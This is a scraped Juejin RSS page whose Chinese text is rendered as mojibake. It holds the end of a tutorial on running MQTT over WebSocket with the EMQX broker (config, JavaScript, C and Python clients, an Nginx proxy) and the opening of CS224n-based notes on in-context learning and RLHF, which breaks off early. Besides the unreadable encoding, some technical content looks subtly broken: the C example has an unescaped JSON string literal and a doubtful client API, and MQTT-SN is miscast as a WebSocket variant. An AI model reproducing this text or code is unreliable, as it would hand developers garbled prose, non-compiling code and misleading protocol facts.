<li><strong>åŒå‘é€šä¿¡</strong>ï¼šäºŒè€…å‡ä¸ºé•¿è¿æ¥ã€åŒå‘é€šä¿¡ï¼Œå®Œç¾åŒ¹é…ç‰©è”ç½‘è®¾å¤‡å®æ—¶ä¸ŠæŠ¥çŠ¶æ€ã€æœåŠ¡å™¨ä¸‹å‘æŒ‡ä»¤çš„éœ€æ±‚ã€‚</li>
</ol>
<p>ç®€å•æ¥è¯´ï¼š<strong>WebSocket è´Ÿè´£ â€œæ‰“é€šç½‘ç»œé€šé“â€ï¼ŒMQTT è´Ÿè´£ â€œå®šä¹‰è®¾å¤‡é€šä¿¡çš„è§„åˆ™â€</strong> ã€‚</p>
<h3 data-id="heading-1">äºŒã€å…·ä½“å®ç°æ–¹å¼ï¼ˆä»¥ä¸»æµçš„ EMQX ä¸ºä¾‹ï¼‰</h3>
<p>EMQX æ˜¯å¼€æºçš„é«˜æ€§èƒ½ MQTT Brokerï¼ŒåŸç”Ÿæ”¯æŒ MQTT over WebSocketï¼Œæ˜¯ç‰©è”ç½‘åœºæ™¯çš„é¦–é€‰ï¼Œä»¥ä¸‹æ˜¯ä»<strong>æœåŠ¡ç«¯é…ç½®ã€å®¢æˆ·ç«¯æ¥å…¥</strong>çš„å®Œæ•´å®ç°æ­¥éª¤ï¼š</p>
<h4 data-id="heading-2">1. æœåŠ¡ç«¯ï¼šé…ç½® EMQX æ”¯æŒ MQTT over WebSocket</h4>
<p>EMQX é»˜è®¤å¼€å¯äº† WebSocket ç›‘å¬ï¼Œæ— éœ€å¤æ‚é…ç½®å³å¯ä½¿ç”¨ï¼Œå…³é”®å‚æ•°å¯å‚è€ƒï¼š</p>
<ul>
<li>
<p><strong>é»˜è®¤ç«¯å£</strong>ï¼š</p>
<ul>
<li>éåŠ å¯† WebSocketï¼ˆws://ï¼‰ï¼š8083 ç«¯å£ï¼ˆå¯¹åº” MQTT TCP çš„ 1883ï¼‰ï¼›</li>
<li>åŠ å¯† WebSocketï¼ˆwss://ï¼‰ï¼š8084 ç«¯å£ï¼ˆå¯¹åº” MQTT TCP çš„ 8883ï¼‰ï¼›</li>
</ul>
</li>
<li>
<p><strong>éªŒè¯é…ç½®</strong>ï¼šæ‰“å¼€ EMQX çš„é…ç½®æ–‡ä»¶ï¼ˆ<code>emqx.conf</code>ï¼‰ï¼Œç¡®è®¤ WebSocket ç›‘å¬å™¨å·²å¯ç”¨ï¼š</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># å¯ç”¨WebSocketç›‘å¬å™¨</span>
listeners.ws.default {
  <span class="hljs-attr">bind</span> = <span class="hljs-string">"0.0.0.0:8083"</span>
  <span class="hljs-attr">max_connections</span> = <span class="hljs-number">1024000</span> <span class="hljs-comment"># æœ€å¤§è¿æ¥æ•°</span>
}
<span class="hljs-comment"># å¯ç”¨WSSï¼ˆåŠ å¯†ï¼‰ç›‘å¬å™¨</span>
listeners.wss.default {
  <span class="hljs-attr">bind</span> = <span class="hljs-string">"0.0.0.0:8084"</span>
  ssl_options {
    <span class="hljs-attr">certfile</span> = <span class="hljs-string">"/etc/emqx/certs/emqx.pem"</span>
    <span class="hljs-attr">keyfile</span> = <span class="hljs-string">"/etc/emqx/certs/emqx.key"</span>
  }
}
</code></pre>
</li>
<li>
<p><strong>å¯åŠ¨ EMQX</strong>ï¼šå¯åŠ¨åå¯é€šè¿‡ EMQX Dashboardï¼ˆé»˜è®¤<a href="https://link.juejin.cn?target=http%3A%2F%2Flocalhost%3A18083%2F" target="_blank" title="http://localhost:18083/" ref="nofollow noopener noreferrer">http://localhost:18083</a>ï¼‰æŸ¥çœ‹ WebSocket è¿æ¥çŠ¶æ€ï¼Œç¡®è®¤ç›‘å¬å™¨æ­£å¸¸è¿è¡Œã€‚</p>
</li>
</ul>
<h4 data-id="heading-3">2. å®¢æˆ·ç«¯æ¥å…¥ï¼šè®¾å¤‡ / å‰ç«¯é€šè¿‡ WebSocket è¿æ¥ MQTT Broker</h4>
<p>æ ¹æ®å®¢æˆ·ç«¯ç±»å‹ï¼ˆåµŒå…¥å¼è®¾å¤‡ã€ç½‘é¡µå‰ç«¯ã€åç«¯æœåŠ¡ï¼‰ï¼Œæœ‰ä¸åŒçš„æ¥å…¥æ–¹å¼ï¼Œæ ¸å¿ƒæ˜¯ä½¿ç”¨æ”¯æŒ MQTT over WebSocket çš„å®¢æˆ·ç«¯åº“ã€‚</p>
<h5 data-id="heading-4">ï¼ˆ1ï¼‰ç½‘é¡µå‰ç«¯ï¼ˆæµè§ˆå™¨ï¼‰æ¥å…¥ï¼ˆæœ€å¸¸è§åœºæ™¯ï¼‰</h5>
<p>æµè§ˆå™¨æœ¬èº«ä¸æ”¯æŒåŸç”Ÿ MQTTï¼Œä½†å¯é€šè¿‡ WebSocket è¿æ¥ EMQX çš„ 8083 ç«¯å£ï¼Œä½¿ç”¨ MQTT å®¢æˆ·ç«¯åº“ï¼ˆå¦‚<code>mqtt.js</code>ï¼‰å®ç°é€šä¿¡ï¼š</p>
<ul>
<li>
<p><strong>å®‰è£…ä¾èµ–</strong>ï¼š</p>
<pre><code class="hljs language-css" lang="css">npm install mqtt <span class="hljs-attr">--save</span>
</code></pre>
</li>
<li>
<p><strong>ä»£ç ç¤ºä¾‹</strong>ï¼š</p>
<p>javascript</p>
<p>è¿è¡Œ</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> mqtt <span class="hljs-keyword">from</span> <span class="hljs-string">'mqtt'</span>;

<span class="hljs-comment">// è¿æ¥é…ç½®ï¼šWebSocketåœ°å€æ ¼å¼ä¸º ws://brokeråœ°å€:8083/mqtt</span>
<span class="hljs-keyword">const</span> client = mqtt.<span class="hljs-title function_">connect</span>(<span class="hljs-string">'ws://localhost:8083/mqtt'</span>, {
  <span class="hljs-attr">clientId</span>: <span class="hljs-string">'web-client-123'</span>, <span class="hljs-comment">// å”¯ä¸€å®¢æˆ·ç«¯ID</span>
  <span class="hljs-attr">username</span>: <span class="hljs-string">'admin'</span>, <span class="hljs-comment">// å¯é€‰ï¼ŒEMQXé»˜è®¤ç”¨æˆ·å</span>
  <span class="hljs-attr">password</span>: <span class="hljs-string">'public'</span>, <span class="hljs-comment">// å¯é€‰ï¼ŒEMQXé»˜è®¤å¯†ç </span>
  <span class="hljs-attr">keepalive</span>: <span class="hljs-number">60</span>, <span class="hljs-comment">// å¿ƒè·³é—´éš”ï¼ˆç§’ï¼‰</span>
});

<span class="hljs-comment">// è¿æ¥æˆåŠŸå›è°ƒ</span>
client.<span class="hljs-title function_">on</span>(<span class="hljs-string">'connect'</span>, <span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'WebSocket + MQTT è¿æ¥æˆåŠŸ'</span>);
  <span class="hljs-comment">// è®¢é˜…è®¾å¤‡çŠ¶æ€ä¸»é¢˜</span>
  client.<span class="hljs-title function_">subscribe</span>(<span class="hljs-string">'device/aircon/status'</span>, <span class="hljs-function">(<span class="hljs-params">err</span>) =&gt;</span> {
    <span class="hljs-keyword">if</span> (!err) <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'è®¢é˜…æˆåŠŸ'</span>);
  });
  <span class="hljs-comment">// å‘å¸ƒæŒ‡ä»¤ï¼ˆæ§åˆ¶ç©ºè°ƒï¼‰</span>
  client.<span class="hljs-title function_">publish</span>(<span class="hljs-string">'device/aircon/control'</span>, <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>({ <span class="hljs-attr">temp</span>: <span class="hljs-number">26</span> }));
});

<span class="hljs-comment">// æ¥æ”¶æ¶ˆæ¯å›è°ƒ</span>
client.<span class="hljs-title function_">on</span>(<span class="hljs-string">'message'</span>, <span class="hljs-function">(<span class="hljs-params">topic, payload</span>) =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`æ”¶åˆ°ä¸»é¢˜ <span class="hljs-subst">${topic}</span> çš„æ¶ˆæ¯ï¼š<span class="hljs-subst">${payload.toString()}</span>`</span>);
});
</code></pre>
<p><strong>å…³é”®æ³¨æ„</strong>ï¼šWebSocket çš„ URL è·¯å¾„å¿…é¡»æ˜¯<code>/mqtt</code>ï¼ˆEMQX ç­‰ Broker çš„çº¦å®šï¼‰ï¼Œå¦åˆ™ä¼šè¿æ¥å¤±è´¥ã€‚</p>
</li>
</ul>
<h5 data-id="heading-5">ï¼ˆ2ï¼‰åµŒå…¥å¼è®¾å¤‡æ¥å…¥ï¼ˆå¦‚å°ç±³ç©ºè°ƒ / ç”µè§†ï¼‰</h5>
<p>åµŒå…¥å¼è®¾å¤‡ï¼ˆå¦‚åŸºäº ESP32ã€Linux çš„æ™ºèƒ½è®¾å¤‡ï¼‰å¯ä½¿ç”¨ MQTT å®¢æˆ·ç«¯åº“ï¼ˆå¦‚<code>paho-mqtt</code>ã€<code>emqx-mqtt-c</code>ï¼‰ï¼Œé€šè¿‡ WebSocket åè®®è¿æ¥ Brokerï¼š</p>
<ul>
<li>
<p>ä»¥ C è¯­è¨€çš„<code>emqx-mqtt-c</code>ä¸ºä¾‹ï¼Œæ ¸å¿ƒé…ç½®ï¼š</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-selector-id">#include</span> "emqx_mqtt_c<span class="hljs-selector-class">.h</span>"

int <span class="hljs-selector-tag">main</span>() {
  <span class="hljs-comment">// è¿æ¥å‚æ•°ï¼šæŒ‡å®šWebSocketåè®®ï¼Œç«¯å£8083</span>
  mqtt_client_t client;
  <span class="hljs-built_in">mqtt_client_init</span>(&amp;client);
  <span class="hljs-built_in">mqtt_client_set_port</span>(&amp;client, <span class="hljs-number">8083</span>);
  <span class="hljs-built_in">mqtt_client_set_protocol</span>(&amp;client, MQTT_PROTOCOL_WS); <span class="hljs-comment">// å¯ç”¨WebSocket</span>
  <span class="hljs-built_in">mqtt_client_set_host</span>(&amp;client, "localhost");
  <span class="hljs-built_in">mqtt_client_set_client_id</span>(&amp;client, "device-aircon-<span class="hljs-number">456</span>");

  <span class="hljs-comment">// è¿æ¥Broker</span>
  if (mqtt_client_connect(&amp;client) == <span class="hljs-number">0</span>) {
    <span class="hljs-built_in">printf</span>("è®¾å¤‡é€šè¿‡WebSocketè¿æ¥MQTTæˆåŠŸ\n");
    <span class="hljs-comment">// ä¸ŠæŠ¥çŠ¶æ€</span>
    <span class="hljs-built_in">mqtt_client_publish</span>(&amp;client, "device/aircon/status", "{"temp":<span class="hljs-number">26</span>}", <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);
  }
  return <span class="hljs-number">0</span>;
}
</code></pre>
</li>
</ul>
<h5 data-id="heading-6">ï¼ˆ3ï¼‰åç«¯æœåŠ¡æ¥å…¥</h5>
<p>åç«¯æœåŠ¡ï¼ˆå¦‚ Javaã€Pythonï¼‰å¯é€šè¿‡ MQTT å®¢æˆ·ç«¯åº“ç›´æ¥è¿æ¥ WebSocket ç«¯å£ï¼Œå®ç°å¯¹è®¾å¤‡çš„ç®¡ç†ï¼š</p>
<ul>
<li>
<p>Python ç¤ºä¾‹ï¼ˆä½¿ç”¨<code>paho-mqtt</code>ï¼‰ï¼š</p>
<p>python</p>
<p>è¿è¡Œ</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> paho.mqtt.client <span class="hljs-keyword">as</span> mqtt

<span class="hljs-keyword">def</span> <span class="hljs-title function_">on_connect</span>(<span class="hljs-params">client, userdata, flags, rc</span>):
  <span class="hljs-built_in">print</span>(<span class="hljs-string">f"è¿æ¥æˆåŠŸï¼ŒçŠ¶æ€ç ï¼š<span class="hljs-subst">{rc}</span>"</span>)
  client.subscribe(<span class="hljs-string">"device/#"</span>)

<span class="hljs-keyword">def</span> <span class="hljs-title function_">on_message</span>(<span class="hljs-params">client, userdata, msg</span>):
  <span class="hljs-built_in">print</span>(<span class="hljs-string">f"<span class="hljs-subst">{msg.topic}</span> : <span class="hljs-subst">{msg.payload.decode()}</span>"</span>)

<span class="hljs-comment"># è¿æ¥WebSocketç«¯å£</span>
client = mqtt.Client(client_id=<span class="hljs-string">"server-client-789"</span>, transport=<span class="hljs-string">"websockets"</span>)
client.on_connect = on_connect
client.on_message = on_message
client.username_pw_set(<span class="hljs-string">"admin"</span>, <span class="hljs-string">"public"</span>)
client.connect(<span class="hljs-string">"localhost"</span>, <span class="hljs-number">8083</span>, <span class="hljs-number">60</span>)

client.loop_forever()
</code></pre>
</li>
</ul>
<h3 data-id="heading-7">ä¸‰ã€MQTT+WebSocket çš„éƒ¨ç½²ä¼˜åŒ–ï¼ˆåº”å¯¹å¤§è§„æ¨¡è®¾å¤‡ï¼‰</h3>
<p>å½“è®¾å¤‡é‡ä¸Šå‡æ—¶ï¼Œéœ€å¯¹æ¶æ„è¿›è¡Œä¼˜åŒ–ï¼Œé¿å…å•ç‚¹ç“¶é¢ˆï¼š</p>
<ol>
<li>
<p><strong>è´Ÿè½½å‡è¡¡</strong>ï¼šä½¿ç”¨ Nginx æˆ– HAProxy ä»£ç† WebSocket è¿æ¥ï¼Œå°†è¯·æ±‚åˆ†å‘åˆ°å¤šä¸ª EMQX èŠ‚ç‚¹ï¼š</p>
<p>nginx</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># Nginxé…ç½®ç¤ºä¾‹</span>
http {
  upstream emqx_ws {
    server 192.168.1.10:8083<span class="hljs-comment">;</span>
    server 192.168.1.11:8083<span class="hljs-comment">;</span>
  }

  server {
    listen 80<span class="hljs-comment">;</span>
    server_name mqtt.example.com<span class="hljs-comment">;</span>

    location /mqtt {
      proxy_pass http://emqx_ws<span class="hljs-comment">;</span>
      proxy_http_version 1.1<span class="hljs-comment">;</span>
      proxy_set_header Upgrade $http_upgrade<span class="hljs-comment">;</span>
      proxy_set_header Connection "upgrade"<span class="hljs-comment">;</span>
      proxy_set_header Host $host<span class="hljs-comment">;</span>
    }
  }
}
</code></pre>
</li>
<li>
<p><strong>é›†ç¾¤åŒ–éƒ¨ç½²</strong>ï¼šå°† EMQX éƒ¨ç½²ä¸ºé›†ç¾¤ï¼Œå®ç°è¿æ¥æ•°çš„æ°´å¹³æ‰©å±•ï¼Œæ”¯æ’‘åä¸‡ / ç™¾ä¸‡çº§è®¾å¤‡è¿æ¥ã€‚</p>
</li>
<li>
<p><strong>åè®®åˆ†å±‚</strong>ï¼š</p>
<ul>
<li>è®¾å¤‡ç«¯ï¼šå¯¹ä½åŠŸè€—è®¾å¤‡ï¼Œå¯ä½¿ç”¨ MQTT over WebSocket çš„è½»é‡å˜ä½“ï¼ˆå¦‚ MQTT-SNï¼‰ï¼›</li>
<li>æœåŠ¡ç«¯ï¼šä½¿ç”¨ EMQX çš„è§„åˆ™å¼•æ“ï¼Œå°† MQTT æ¶ˆæ¯è½¬å‘åˆ° Kafka/Redisï¼Œé™ä½å®æ—¶è½¬å‘å‹åŠ›ã€‚</li>
</ul>
</li>
</ol>
<h3 data-id="heading-8">å››ã€é€‚ç”¨åœºæ™¯ä¸ä¼˜åŠ¿æ€»ç»“</h3>





















<table><thead><tr><th>åœºæ™¯</th><th>ä¼˜åŠ¿ä½“ç°</th></tr></thead><tbody><tr><td>ç½‘é¡µç«¯æ§åˆ¶æ™ºèƒ½è®¾å¤‡</td><td>æµè§ˆå™¨æ— éœ€æ’ä»¶ï¼Œé€šè¿‡ WebSocket ç›´æ¥ä¸ MQTT Broker é€šä¿¡ï¼Œå®æ—¶æ€§å¼º</td></tr><tr><td>è·¨ç½‘ç»œè®¾å¤‡é€šä¿¡</td><td>WebSocket çš„ 80/443 ç«¯å£æ˜“ç©¿é€é˜²ç«å¢™ï¼Œè§£å†³ä¼ ç»Ÿ MQTT ç«¯å£è¢«å±è”½çš„é—®é¢˜</td></tr><tr><td>æ··åˆç»ˆç«¯æ¥å…¥</td><td>è®¾å¤‡ï¼ˆTCP/MQTTï¼‰ã€ç½‘é¡µï¼ˆWebSocket/MQTTï¼‰ã€æœåŠ¡ç«¯å¯ç»Ÿä¸€æ¥å…¥åŒä¸€ Broker</td></tr></tbody></table>
<h3 data-id="heading-9">äº”ã€æ ¸å¿ƒæ€»ç»“</h3>
<p>MQTT ä¸ WebSocket çš„ç»“åˆæ˜¯ <strong>â€œåè®®å¤ç”¨ + åœºæ™¯é€‚é…â€</strong> çš„å…¸å‹åº”ç”¨ï¼š</p>
<ul>
<li><strong>åº•å±‚</strong>ï¼šWebSocket æä¾›å¯é çš„é•¿è¿æ¥é€šé“ï¼Œè§£å†³ç½‘ç»œç©¿é€å’Œç½‘é¡µç«¯æ¥å…¥é—®é¢˜ï¼›</li>
<li><strong>ä¸Šå±‚</strong>ï¼šMQTT æä¾›è½»é‡çš„å‘å¸ƒ / è®¢é˜…æœºåˆ¶ï¼Œé€‚é…ç‰©è”ç½‘è®¾å¤‡çš„ä½å¸¦å®½ã€é«˜å¹¶å‘éœ€æ±‚ã€‚</li>
</ul>
<p>é€šè¿‡ EMQX ç­‰æˆç†Ÿçš„ MQTT Brokerï¼Œå¯å¿«é€Ÿå®ç°äºŒè€…çš„ç»“åˆï¼Œä¸”æ”¯æŒä»ä¸­å°è§„æ¨¡åˆ°ç™¾ä¸‡çº§è®¾å¤‡çš„å¹³æ»‘æ‰©å±•ï¼Œæ˜¯ç‰©è”ç½‘è¿œç¨‹æ§åˆ¶çš„é¦–é€‰æ–¹æ¡ˆä¹‹ä¸€ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä» In-context Learning åˆ° RLHFï¼šå¤§è¯­è¨€æ¨¡å‹çš„èŒƒå¼è·ƒè¿]]></title>    <link>https://juejin.cn/post/7583984122236026922</link>    <guid>https://juejin.cn/post/7583984122236026922</guid>    <pubDate>2025-12-16T04:28:36.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7583984122236026922" data-draft-id="7583969283790749750" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä» In-context Learning åˆ° RLHFï¼šå¤§è¯­è¨€æ¨¡å‹çš„èŒƒå¼è·ƒè¿"/> <meta itemprop="keywords" content="ç®—æ³•"/> <meta itemprop="datePublished" content="2025-12-16T04:28:36.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ˜Ÿè¾æ ‘"/> <meta itemprop="url" content="https://juejin.cn/user/200544183650531"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä» In-context Learning åˆ° RLHFï¼šå¤§è¯­è¨€æ¨¡å‹çš„èŒƒå¼è·ƒè¿
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/200544183650531/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ˜Ÿè¾æ ‘
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-16T04:28:36.000Z" title="Tue Dec 16 2025 04:28:36 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    3
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»2åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ä» In-context Learning åˆ° RLHFï¼šå¤§è¯­è¨€æ¨¡å‹çš„èŒƒå¼è·ƒè¿</h2>
<p><strong>â€”â€” CS224n Lecture 10 æ·±åº¦ç¬”è®°</strong></p>
<p>è‡ªç„¶è¯­è¨€å¤„ç†ï¼ˆNLPï¼‰åœ¨è¿‡å»å‡ å¹´ç»å†äº†ä¸€åœºæ— å£°çš„é©å‘½ã€‚æˆ‘ä»¬ä¸å†ä¸ºæ¯ä¸ªä»»åŠ¡å¾®è°ƒï¼ˆFine-tuneï¼‰ä¸€ä¸ªä¸“ç”¨æ¨¡å‹ï¼Œè€Œæ˜¯è½¬å‘äº†<strong>é€šç”¨å¤§æ¨¡å‹</strong>çš„è®­ç»ƒã€‚</p>
<p>è¿™ä¸€è½¬å˜å¹¶éä¸€è¹´è€Œå°±ã€‚ä» GPT-2 çš„é›¶æ ·æœ¬å°è¯•ï¼Œåˆ° GPT-3 çš„æƒŠè‰³æ¶Œç°ï¼Œå†åˆ° InstructGPT å¼•å…¥çš„å¼ºåŒ–å­¦ä¹ ï¼Œè¿™æ˜¯ä¸€æ¡ä»â€œé¢„æµ‹ä¸‹ä¸€ä¸ªè¯â€èµ°å‘â€œç†è§£äººç±»æ„å›¾â€çš„è¿›åŒ–ä¹‹è·¯ã€‚</p>
<h3 data-id="heading-1">ä¸€ã€ æ¶Œç°ï¼šä» Zero-shot åˆ° In-context Learning</h3>
<p>åœ¨ BERT æ—¶ä»£ï¼ŒèŒƒå¼æ˜¯â€œé¢„è®­ç»ƒ + ä¸‹æ¸¸ä»»åŠ¡å¾®è°ƒâ€ã€‚ä½† GPT ç³»åˆ—è¯æ˜äº†ï¼Œå½“æ¨¡å‹è¶³å¤Ÿå¤§ã€è¯­æ–™è¶³å¤Ÿå¤šæ—¶ï¼Œ<strong>ä»»åŠ¡å¤„ç†èƒ½åŠ›ä¼šè‡ªç„¶æ¶Œç°</strong>ã€‚</p>
<h4 data-id="heading-2">1. GPT-2 ä¸ é›¶æ ·æœ¬å­¦ä¹  (Zero-shot)</h4>
<p>GPT-2 å±•ç¤ºäº†åªè¦ä½ æœ‰è¶³å¤Ÿçš„<strong>æç¤ºè¯ï¼ˆPromptï¼‰åˆ›é€ åŠ›</strong>ï¼Œæ¨¡å‹å°±èƒ½å®Œæˆæœªè§è¿‡çš„ä»»åŠ¡ã€‚</p>
<ul>
<li><strong>æ‘˜è¦ä»»åŠ¡</strong>ï¼šç ”ç©¶äººå‘˜å‘ç°ï¼Œåªéœ€åœ¨æ–‡ç« æœ«å°¾åŠ ä¸Š <code>TL;DR:</code>ï¼ˆToo Long; Didn't Readï¼‰ï¼Œæ¨¡å‹å°±ä¼šè‡ªåŠ¨è¿›å…¥â€œæ€»ç»“æ¨¡å¼â€ã€‚</li>
<li><strong>é—®ç­”ä¸æŒ‡ä»£æ¶ˆæ­§</strong>ï¼šé€šè¿‡æ„å»ºç‰¹å®šçš„åºåˆ—é¢„æµ‹é—®é¢˜ï¼ˆå¦‚ Winograd Schema Challengeï¼‰ï¼Œæ¨¡å‹åˆ©ç”¨æ¦‚ç‡åˆ†å¸ƒ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi><mo stretchy="false">(</mo><mtext>context</mtext><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">P(\text{context})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord text"><span class="mord">context</span></span><span class="mclose">)</span></span></span></span></span> å°±èƒ½åœ¨æ²¡æœ‰æ¢¯åº¦æ›´æ–°çš„æƒ…å†µä¸‹åšå‡ºé€‰æ‹©ã€‚</li>
</ul>
<h4 data-id="heading-3">2. GPT-3 ä¸ ä¸Šä¸‹æ–‡å­¦ä¹  (In-context Learning)</h4>
<p>GPT-3 è¿›ä¸€æ­¥æå‡ºäº† <strong>Few-shot Learning</strong>ï¼Œæˆ–è€…æ›´å‡†ç¡®åœ°è¯´æ˜¯ <strong>In-context Learning</strong>ã€‚</p>
<ul>
